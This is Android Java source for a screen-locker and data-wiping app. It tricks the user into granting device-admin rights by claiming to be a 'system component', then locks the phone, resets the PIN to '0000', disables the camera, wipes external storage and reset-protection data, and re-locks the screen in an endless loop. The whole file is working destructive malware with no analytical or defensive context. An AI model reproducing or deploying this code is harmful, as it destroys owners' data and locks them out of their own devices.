package com.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;

public class MainActivity extends Activity {
    private static final int ADMIN_INTENT = 1;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override 
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Системный компонент");
            startActivityForResult(intent, ADMIN_INTENT);
        } else {
            executeBreak();
        }
    }

    private void executeBreak() {
        // Блокировка и смена пароля без root
        dpm.lockNow();
        dpm.resetPassword("0000", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        dpm.setCameraDisabled(adminComponent, true);

        // Затирание данных
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE |
                    DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
        }

        // Без root: удерживаем WakeLock и циклически блокируем экран
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysBreaker::NoRoot");
        wl.acquire();

        // Бесконечный цикл блокировки в фоне
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        dpm.lockNow();
                        Thread.sleep(300);
                    } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ADMIN_INTENT) {
            executeBreak();
        }
    }
                                   }
